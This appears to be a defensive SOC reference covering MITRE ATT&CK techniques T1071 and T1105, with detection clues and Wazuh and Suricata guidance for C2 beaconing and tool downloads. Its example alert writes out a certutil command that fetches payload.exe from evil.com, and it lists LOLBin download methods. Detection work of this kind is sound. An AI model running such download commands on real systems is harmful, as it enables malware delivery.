# Application Layer Protocol

**Technique ID:** T1071
**Tactic:** Command and Control

## Description
Adversaries may communicate using application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server.

## Attacker Behavior
Attackers use standard web protocols like HTTP (TCP 80) or HTTPS (TCP 443) for Command and Control (C2) beacons. They may also use DNS, SMTP, or FTP.

## SOC Evidence
- High volume of periodic, small HTTP GET or POST requests to an unknown external IP or domain (beaconing).
- DNS queries for excessively long or seemingly random subdomains (DNS tunneling).
- Connections to suspicious Top Level Domains (TLDs).

## Detection Clues
Look for regular communication patterns (e.g., a connection exactly every 60 seconds with little jitter). Analyze HTTP User-Agent strings for anomalies or default tooling values.

## Related Techniques
- T1090: Proxy
- T1568: Dynamic Resolution

## Example Alert Context
Suricata generates an alert for "Suspicious HTTP Beaconing" when it observes 50 identical HTTP GET requests to `http://unknown-domain.xyz/login.php` originating from a single internal host over an hour.

## Wazuh Relevance
Wazuh can detect the endpoint process initiating the connection by analyzing Sysmon Event ID 3 (Network Connection) or by integrating with endpoint firewalls.

## Suricata Relevance
Suricata is the primary detection tool for this technique. It uses flow analysis, JA3 TLS fingerprinting, and payload inspection to identify C2 frameworks communicating over application protocols.

## Investigation Guidance
Correlate the external IP or domain with threat intelligence feeds. Use Wazuh logs to identify which process initiated the network connection and how that process was launched.

# Ingress Tool Transfer

**Technique ID:** T1105
**Tactic:** Command and Control

## Description
Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols.

## Attacker Behavior
Attackers use built-in tools like `certutil.exe`, `bitsadmin.exe`, `powershell.exe`, or `curl` to download secondary payloads, ransomware encryptors, or post-exploitation frameworks.

## SOC Evidence
- Process execution logs showing `certutil.exe -urlcache -split -f`.
- PowerShell `Invoke-WebRequest` or `Net.WebClient.DownloadFile`.
- Network proxy logs or Suricata alerts showing the download of executable files (`.exe`, `.dll`, `.sh`) from unknown domains.

## Detection Clues
Monitor for native binaries (LOLBins) making outbound HTTP/HTTPS connections. It is highly suspicious for utilities like `certutil` or `msbuild` to download files from the internet.

## Related Techniques
- T1059: Command and Scripting Interpreter
- T1140: Deobfuscate/Decode Files or Information

## Example Alert Context
Wazuh alerts on Sysmon Event ID 1: `certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\Windows\Temp\payload.exe`.

## Wazuh Relevance
Wazuh detects the command line execution of the tools used to transfer files. It can also detect the subsequent file creation (Event ID 11) in temporary directories.

## Suricata Relevance
Suricata can inspect the network stream to detect the download of known malicious files (via file hashes or signatures) or alert on executable files traversing the network perimeter.

## Investigation Guidance
Locate the downloaded file and submit it to a sandbox or threat intelligence platform for analysis. Trace the execution to see if the payload was successfully run.
